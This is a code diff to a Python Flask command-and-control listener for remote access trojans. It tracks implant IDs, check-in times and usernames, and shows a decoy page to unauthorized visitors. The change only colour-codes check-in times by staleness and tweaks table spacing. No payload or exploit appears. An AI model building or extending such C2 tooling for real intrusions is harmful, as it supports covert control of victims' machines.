@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 from flask import Flask, request
+from datetime import datetime
 import time
 import json
 import base64
@@ -52,7 +53,16 @@ def colors(value):
         return( BOLD + c + ">" + js + ">" + ENDC)
     elif(value == "commit Seppuku"):
         return(c + value + ENDC)
-    else:
+    try:
+        checkin = datetime.strptime(value, "%H:%M:%S")
+        delta_seconds = (datetime.now() - checkin).seconds
+        if(delta_seconds > 21):
+            return(BOLD + c + value + ENDC)
+        elif(delta_seconds > 7):
+            return(BOLD + js + value + ENDC)
+        else:
+            return(BOLD + py + value + ENDC)
+    except:
         return(UNDERLINE + value + ENDC)
 
 # Page sent to "unauthorized" users of the http listener
@@ -101,7 +111,7 @@ def serve_server(port=8080):
             return(default_page())
 
         # Update checkin time for an agent every checkin
-        checkin = time.strftime("%H:%M:%S", time.localtime())
+        checkin = datetime.now().strftime("%H:%M:%S")
         rats[ratID] = checkin
         types[ratID] = ratType
         usernames[ratID] = username
@@ -123,13 +133,13 @@ def serve_server(port=8080):
     app.run(host="0.0.0.0", port=port)
 
 def get_rats(current=""):
-    print("\n  implant id \ttype\tcheck-in\tusername")
+    print("\n    implant id \ttype\tcheck-in\tusername")
     print("    ----------\t----\t--------\t--------")
     for ratID, checkin in rats.items():
         if(current == ratID or current == "all"):
-            print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
+            print(" "+colors(">>")+" "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
         else:
-            print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+checkin+" \t"+usernames[ratID])
+            print("    "+ratID+" \t"+colors(types[ratID])+"  \t"+colors(checkin)+" \t"+usernames[ratID])
     print("")
 
 def remove_rat(ratID):
